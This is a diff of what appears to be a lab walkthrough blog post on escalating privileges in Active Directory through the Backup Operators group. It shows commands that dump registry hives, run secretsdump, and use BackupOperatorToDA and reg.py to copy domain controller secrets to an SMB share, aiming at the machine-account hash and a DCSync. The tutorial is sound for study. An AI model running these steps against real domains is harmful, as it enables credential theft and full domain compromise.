@@ -41,7 +41,6 @@ A new window will open where we need to select object types as “**Groups or Bu
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-4.png)](https://r00tven0m.github.io/)
 
-
 We can verify whether a user is added to the backups operators’ group by simply clicking on the **members of** tab. We can see that we have successfully added user Serena.Alla to backups operators’ group.
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-5.png)](https://r00tven0m.github.io/)
@@ -76,7 +75,6 @@ reg save hklm\security C:\Users\serena.alla\Documents\security.sav
 ```
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-8.png)](https://r00tven0m.github.io/)
-
 ### secretsdump.py 
 
 ```bash
@@ -84,7 +82,6 @@ impacket-secretsdump LOCAL -system system.sav -sam sam.sav
 ```
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-9.png)](https://r00tven0m.github.io/)
-
 but we get hashes local users we need get all hash DC
 
 #### Attacking a Domain Controller  with [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)
@@ -96,7 +93,6 @@ net use G: \\192.168.56.1\test /u:test test
 .\BackupOperatorToDA-x64.exe -t \\dc01.cbank.local -o G:\\
 ```
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-11.png)](https://r00tven0m.github.io/)
-
 #### Aonther Way Attacking a Domain Controller  with  [reg.py](https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py "reg.py")
 
 
@@ -105,13 +101,11 @@ python3 reg.py Serena.Alla:'Password123'@192.168.56.100 backup -p '\\192.168.56.
 ```
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-12.png)](https://r00tven0m.github.io/)
-
 ```bash
 impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
 ```
 
 [![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-13.png)](https://r00tven0m.github.io/)
-
 Nice We Can get hash MACHINE ACCOUNT `DC01$` 
 Now the NTLM hash for the Domain Controller has been extracted.
 Now we will provide the NT hash to the secretsdump tool along with the name of the Domain Controller to extract all users present in the Active Directory environment with their respective hashes via a file. The machine account credentials could then be used to DCSync domain credentials.
